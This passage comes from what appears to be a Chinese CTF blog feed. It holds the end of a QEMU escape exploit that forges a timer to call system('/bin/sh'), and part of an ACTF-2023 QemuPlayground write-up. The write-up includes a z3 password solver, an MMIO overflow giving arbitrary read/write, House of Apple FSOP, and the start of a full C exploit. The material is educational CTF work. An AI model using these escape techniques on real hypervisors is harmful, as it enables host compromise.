uint64_t;</span></span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> pmio_base = <span class="number">0x000000000000c050</span>;</span><br><span class="line"><span class="type">void</span> * mmio_mem;</span><br><span class="line"><span class="type">char</span>* userbuf;</span><br><span class="line"><span class="type">uint64_t</span> phy_userbuf;</span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Err</span><span class="params">(<span class="type">char</span>* err)</span>{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Error: %s\n"</span>, err);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">page_offset</span><span class="params">(<span class="type">uint32_t</span> addr)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">return</span> addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">gva_to_gfn</span><span class="params">(<span class="type">void</span> *addr)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">uint64_t</span> pme, gfn;</span><br><span class="line">    <span class="type">size_t</span> offset;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">"/proc/self/pagemap"</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) {</span><br><span class="line">        Err(<span class="string">"open pagemap"</span>);</span><br><span class="line">    }</span><br><span class="line">    offset = ((<span class="type">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>;</span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line">    read(fd, &amp;pme, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (!(pme &amp; PFN_PRESENT))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    gfn = pme &amp; PFN_PFN;</span><br><span class="line">    <span class="keyword">return</span> gfn;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">gva_to_gpa</span><span class="params">(<span class="type">void</span> *addr)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">uint64_t</span> gfn = gva_to_gfn(addr);</span><br><span class="line">    assert(gfn != <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="type">uint64_t</span>)addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">va2pa</span><span class="params">(<span class="type">void</span> *addr)</span>{</span><br><span class="line">    <span class="type">uint64_t</span> data;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> pagesize = getpagesize();</span><br><span class="line">    <span class="type">size_t</span> offset = ((<span class="type">uintptr_t</span>)addr / pagesize) * <span class="keyword">sizeof</span>(<span class="type">uint64_t</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(lseek(fd,offset,SEEK_SET) &lt; <span class="number">0</span>){</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"lseek"</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(read(fd,&amp;data,<span class="number">8</span>) != <span class="number">8</span>){</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"read"</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(data &amp; (((<span class="type">uint64_t</span>)<span class="number">1</span> &lt;&lt; <span class="number">63</span>)))){</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"page"</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> pageframenum = data &amp; ((<span class="number">1ull</span> &lt;&lt; <span class="number">55</span>) - <span class="number">1</span>);</span><br><span class="line">    <span class="type">size_t</span> phyaddr = pageframenum * pagesize + (<span class="type">uintptr_t</span>)addr % pagesize;</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> phyaddr;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr)</span>{</span><br><span class="line">        <span class="keyword">return</span> *(<span class="type">uint64_t</span> *)( mmio_mem + addr );</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr,<span class="type">uint64_t</span> val)</span>{</span><br><span class="line">        *(<span class="type">uint64_t</span> *)(mmio_mem + addr) = val;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_write</span><span class="params">(<span class="type">uint32_t</span> addr,<span class="type">uint32_t</span> val)</span>{</span><br><span class="line">    outl(val,pmio_base+addr);</span><br><span class="line">}</span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_writeb</span><span class="params">(<span class="type">uint32_t</span> addr,<span class="type">uint8_t</span> val)</span>{</span><br><span class="line">    outb(val,pmio_base+addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint32_t</span> addr)</span>{</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">uint32_t</span>)inl(pmio_base+addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">pmio_readb</span><span class="params">(<span class="type">uint32_t</span> addr)</span>{</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">uint8_t</span>)inb(pmio_base+addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_mmio</span><span class="params">()</span>{</span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">"/sys/devices/pci0000:00/0000:00:04.0/resource0"</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span>(mmio_fd &lt; <span class="number">0</span>){</span><br><span class="line">        Err(<span class="string">"Open pci"</span>);</span><br><span class="line">    }</span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(mmio_mem&lt;<span class="number">0</span>){</span><br><span class="line">        Err(<span class="string">"mmap mmio_mem"</span>);</span><br><span class="line">    }</span><br><span class="line">    LOG(<span class="string">"mmio_init"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_pmio</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) !=<span class="number">0</span> )</span><br><span class="line">        Err(<span class="string">"I/O permission is not enough"</span>);</span><br><span class="line">    LOG(<span class="string">"pmio_init"</span>);</span><br><span class="line">    </span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_pa</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    fd = open(<span class="string">"/proc/self/pagemap"</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) {</span><br><span class="line">        perror(<span class="string">"open"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    }</span><br><span class="line">    LOG(<span class="string">"pa_init"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QEMUTimer</span> {</span></span><br><span class="line">    <span class="type">int64_t</span> expire_time;        <span class="comment">/* in nanoseconds */</span></span><br><span class="line">    <span class="type">void</span>*timer_list;</span><br><span class="line">    <span class="type">void</span>*cb;</span><br><span class="line">    <span class="type">void</span> *opaque;</span><br><span class="line">    <span class="type">void</span>*next;</span><br><span class="line">    <span class="type">int</span> attributes;</span><br><span class="line">    <span class="type">int</span> scale;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QEMUTimer</span> <span class="title">timer</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    init_mmio();</span><br><span class="line">    init_pa();</span><br><span class="line"></span><br><span class="line"><span class="comment">//泄露地址</span></span><br><span class="line">    mmio_write(<span class="number">0x200</span>,<span class="number">-0x2</span>);</span><br><span class="line">    <span class="type">uint64_t</span> timer_addr = mmio_read(<span class="number">0</span>);</span><br><span class="line">    HEX(timer_addr);</span><br><span class="line"></span><br><span class="line">    mmio_write(<span class="number">0x200</span>,<span class="number">-0x179</span>);</span><br><span class="line">    <span class="type">uint64_t</span> g_free_plt = mmio_read(<span class="number">0</span>);</span><br><span class="line">    HEX(g_free_plt);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> pie_base = g_free_plt<span class="number">-0x2debd0</span>;</span><br><span class="line">    <span class="type">uint64_t</span> binsh_addr = pie_base + <span class="number">0xA62430</span>;</span><br><span class="line">    <span class="type">uint64_t</span> system_addr = pie_base + <span class="number">0x2DE310</span>;</span><br><span class="line">    HEX(pie_base);</span><br><span class="line">    HEX(system_addr);</span><br><span class="line"></span><br><span class="line">    mmio_write(<span class="number">0x100</span>,<span class="number">0x30</span>);<span class="comment">//chunk_size</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//伪造timer</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;timer,<span class="number">0</span>,<span class="keyword">sizeof</span>(timer));</span><br><span class="line">    timer.expire_time = <span class="number">0</span>;</span><br><span class="line">    timer.cb = system_addr;</span><br><span class="line">    timer.next = <span class="literal">NULL</span>;</span><br><span class="line">    timer.opaque = binsh_addr;</span><br><span class="line">    timer.scale = <span class="number">1000000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">8</span>] = <span class="string">"HanQi.."</span>;</span><br><span class="line">    mmio_write(<span class="number">0x800</span>,<span class="number">1</span>); <span class="comment">//bh_flag = 1</span></span><br><span class="line">    mmio_write(<span class="number">0x700</span>,<span class="number">1</span>); <span class="comment">//bh_rw_flag = 1</span></span><br><span class="line">    mmio_write(<span class="number">0x900</span>,gva_to_gpa(buf)); <span class="comment">//physical</span></span><br><span class="line">    mmio_write(<span class="number">0xF00</span>,<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">//触发mmio_write</span></span><br><span class="line">    mmio_write(<span class="number">0x800</span>,<span class="number">1</span>); <span class="comment">//bh_flag = 1</span></span><br><span class="line">    mmio_write(<span class="number">0x900</span>,<span class="number">0xfebf1000</span>+<span class="number">0xF00</span>); <span class="comment">//physical</span></span><br><span class="line">    mmio_write(<span class="number">0x700</span>,<span class="number">0</span>); <span class="comment">//bh_rw_flag = 0</span></span><br><span class="line">    mmio_write(<span class="number">0x600</span>,<span class="number">1</span>);<span class="comment">//timer_flag = 1</span></span><br><span class="line">    mmio_write(<span class="number">0x400</span>,<span class="number">1</span>);<span class="comment">//free_flag = 1</span></span><br><span class="line">    mmio_write(<span class="number">0x500</span>,<span class="number">1</span>); <span class="comment">//chunk_flag = 1</span></span><br><span class="line">    mmio_write(<span class="number">0xF00</span>,gva_to_gpa(&amp;timer));</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312032247696.png"></p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> Qemu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> Qemu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACTF-2023 QemuPlayground</title>
      <link href="/2023/ACTF-2023%20QemuPlayground/"/>
      <url>/2023/ACTF-2023%20QemuPlayground/</url>
      
        <content type="html"><![CDATA[<p>说再见之前,用Apple交换flag♥</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>去符号表的Qemu逃逸.</p><span id="more"></span><p>使用ida2pat工具从有符号的qemu-x86-64中制作模式文件和签名,导入到IDA中,基本没几个函数能识别的,不知道是工具问题还是库版本问题.</p><p>从已有的idb中导出local_types到头文件中,再导入到IDA中,parse错误,好像是IDA导出的头文件不是标准的C语法格式,不能直接使用.</p><p>只能嗯逆了.</p><p>搜索设备名actf,查看交叉引用,能找到Typeinfo结构体,从而找到class_init和instance_init,进一步找到realize函数.</p><p>标准qemu pwn的realize函数,可以找到mmio、pmio的函数表.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311301436705.png"></p><p>从mmio,pmio的读写函数以及其进一步的调用链可以逆出ACTF设备的关键结构</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ActfState</span><br><span class="line">{</span><br><span class="line"><span class="number">0xA30</span>(<span class="number">1</span>): working</span><br><span class="line"><span class="number">0xA31</span>(<span class="number">1</span>): authentication</span><br><span class="line"><span class="number">0xA34</span><span class="number">-0xA38</span>: key</span><br><span class="line"><span class="number">0xA38</span><span class="number">-0xA78</span> <span class="type">char</span> passwd[<span class="number">0x40</span>]</span><br><span class="line"><span class="number">0xA78</span>(<span class="number">8</span>): buf_ptr</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>然后大概逻辑是mmio读写密码,pmio在buf上读写(buf_ptr是一个堆指针).但是要先通过密码认证才能使用申请buf.</p><h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><p>现在是,逆向时间!<br>说实话这种逆向对我来说就是天书,我只喜欢逆结构体和逻辑,和运算有关的别来沾边吧..<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311301907372.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311301907374.png"></p><p>逆完用z3求解.</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">xs = [BitVec(<span class="string">f'x<span class="subst">{i}</span>'</span>,<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x40</span>)]</span><br><span class="line">v14 = [BitVec(<span class="string">f'z<span class="subst">{i}</span>'</span>,<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>)]</span><br><span class="line">v9 = [<span class="number">0x7f</span>, <span class="number">0xac</span>, <span class="number">0x34</span>, <span class="number">0x12</span>] * <span class="number">8</span></span><br><span class="line"></span><br><span class="line">order = xs.copy()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x40</span>):</span><br><span class="line">    s.add(xs[i] &lt;= <span class="number">0x7f</span>)</span><br><span class="line">    s.add(xs[i] &gt;= <span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">b''</span>.join(<span class="built_in">map</span>(p64,[<span class="number">0xABA29EC2A98DD89A</span>, <span class="number">0xBBF1B4AB81B4A9D4</span>, <span class="number">0xFB92A48DB386FFA8</span>, <span class="number">0xEFB491B8AFB4ABD3</span>, <span class="number">0x80EF69F1CBD00397</span>, <span class="number">0xB2EB07859CDA52D3</span>, <span class="number">0xEC9E22F5A5A07FA3</span>, <span class="number">0x4B36DF7B5B655A84</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xA</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>):</span><br><span class="line">        v12 = xs[j] ^ xs[<span class="number">0x20</span>+j]</span><br><span class="line">        v13 = (v9[j] ^ (j+<span class="number">0x11</span>*i))&amp;<span class="number">0xFF</span></span><br><span class="line">        v9[j] = v13</span><br><span class="line">        v14[j] = v13 ^ v12</span><br><span class="line"></span><br><span class="line">    xs[:<span class="number">0x20</span>] = xs[<span class="number">0x20</span>:]</span><br><span class="line">    xs[<span class="number">0x20</span>:] = v14[:<span class="number">0x20</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x40</span>):</span><br><span class="line">    s.add(xs[i] == cipher[i])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    flag = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> order:</span><br><span class="line">        flag.append(<span class="built_in">int</span>(<span class="string">f'<span class="subst">{m[i]}</span>'</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">''</span>.join(<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> flag))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"no sol"</span>)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>拿到密码(密码是flag的格式是因为这部分还真是一道逆向):</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ACTF{cH3cK_1n_wI7h_B@by_C1ph3r_Te$t_1n_Q3MU_pl4yg3OuNd_1$_EASy!}</span><br></pre></td></tr></tbody></table></figure><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>mmio_write/mmio_read在读写paasswd时有个4字节的溢出<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311301604896.png"><br>相当于:</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint32_t</span> buf[<span class="number">0x10</span>];</span><br><span class="line">buf[<span class="number">0x10</span>] = val;</span><br></pre></td></tr></tbody></table></figure><p>于是可以控制到buf_ptr的低四位.</p><p>动调看一下buf_ptr,发现高位为0x7f45,结合上溢出即可完成0x7f4500000000-0x7f45ffffffff(只是举个例子,有ASLR的)地址范围内的任意读写.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311302337458.png"></p><p>用leakfind搜索一下,找到0x7fce3c000000+0x8a0那一条泄露链,<br>从0x8a0,0x870这俩偏移可以猜到是线程堆的malloc_state.查看最后的libc地址,确实是&amp;main_arena.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312011602760.png"></p><p>fsop打House of Apple,执行”cat flag 1&gt;&amp;2”.<br>(cat flag不行,sh不行,不太懂)<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312011602460.png"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HEX(x) printf(<span class="string">"[*]0x%016llx\n"</span>, (unsigned long long)x)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOG(addr) printf(<span class="string">"[*]%s\n"</span>, addr)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_PFN ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOWMASK 0xffffffff</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIGHMASK 0xffffffff00000000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// typedef unsigned long long uint64_t;</span></span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> pmio_base = <span class="number">0x000000000000c040</span>;</span><br><span class="line"><span class="type">void</span> * mmio_mem;</span><br><span class="line"><span class="type">char</span>* userbuf;</span><br><span class="line"><span class="type">uint64_t</span> phy_userbuf;</span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Err</span><span class="params">(<span class="type">char</span>* err)</span>{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Error: %s\n"</span>, err);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">page_offset</span><span class="params">(<span class="type">uint32_t</span> addr)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">return</span> addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">gva_to_gfn</span><span class="params">(<span class="type">void</span> *addr)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">uint64_t</span> pme, gfn;</span><br><span class="line">    <span class="type">size_t</span> offset;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">"/proc/self/pagemap"</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) {</span><br><span class="line">        Err(<span class="string">"open pagemap"</span>);</span><br><span class="line">    }</span><br><span class="line">    offset = ((<span class="type">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>;</span><br><span class="line">    